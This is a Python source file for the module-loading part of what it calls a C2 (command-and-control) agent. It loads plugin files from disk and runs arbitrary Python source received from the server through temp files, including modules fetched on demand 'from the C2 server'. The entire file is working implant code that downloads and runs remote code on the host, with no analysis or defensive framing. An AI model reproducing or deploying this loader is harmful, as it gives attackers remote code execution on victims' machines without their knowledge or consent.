"""Plugin/module system — dynamic loading and execution of capability modules.
Modules are Python files that expose a `run(args: list[str]) -> str` function.
They can be loaded from disk, downloaded from the server, or sent inline."""

import importlib
import importlib.util
import sys
import os
import tempfile
import traceback
from typing import Optional


MODULES_DIR = os.path.join(os.path.dirname(__file__))


class ModuleLoader:
    """Loads and executes capability modules dynamically."""

    def __init__(self, modules_dir: str = None):
        self.modules_dir = modules_dir or MODULES_DIR
        self._loaded: dict = {}

    def list_modules(self) -> list[str]:
        """List available module names in the modules directory."""
        available = []
        if not os.path.isdir(self.modules_dir):
            return available
        for entry in os.listdir(self.modules_dir):
            if entry.endswith(".py") and not entry.startswith("_"):
                name = entry[:-3]
                available.append(name)
        return sorted(available)

    def load_module(self, name: str) -> Optional[object]:
        """Load a module by name from the modules directory."""
        if name in self._loaded:
            return self._loaded[name]

        module_path = os.path.join(self.modules_dir, f"{name}.py")
        if not os.path.isfile(module_path):
            raise FileNotFoundError(f"Module not found: {module_path}")

        spec = importlib.util.spec_from_file_location(f"c2_module_{name}", module_path)
        if spec is None or spec.loader is None:
            raise ImportError(f"Cannot load module spec from {module_path}")

        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)

        if not hasattr(module, "run"):
            raise AttributeError(f"Module '{name}' has no 'run(args)' function")

        self._loaded[name] = module
        return module

    def execute(self, name: str, args: list[str] = None) -> str:
        """Load and execute a module, returning its output as a string."""
        try:
            module = self.load_module(name)
            return module.run(args or [])
        except Exception:
            return f"Module execution error:\n{traceback.format_exc()}"

    def execute_from_source(self, source: str, args: list[str] = None) -> str:
        """Execute a module from raw Python source code (sent from server).
        The source must define a `run(args)` function."""
        try:
            with tempfile.NamedTemporaryFile(
                mode="w", suffix=".py", delete=False, dir=tempfile.gettempdir()
            ) as f:
                f.write(source)
                temp_path = f.name

            spec = importlib.util.spec_from_file_location("_inline_module", temp_path)
            if spec is None or spec.loader is None:
                raise ImportError("Cannot load inline module spec")

            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)

            if not hasattr(module, "run"):
                return "Inline module has no 'run(args)' function"

            result = module.run(args or [])
            os.unlink(temp_path)
            return result

        except Exception:
            return f"Inline module error:\n{traceback.format_exc()}"

    def load_from_server(self, module_name: str, server_callback=None) -> str:
        """Request a module from the C2 server and execute it.
        The server_callback function should return the module source code."""
        if server_callback is None:
            return "No server callback configured"

        source = server_callback(module_name)
        if not source:
            return f"Module '{module_name}' not found on server"

        return self.execute_from_source(source)
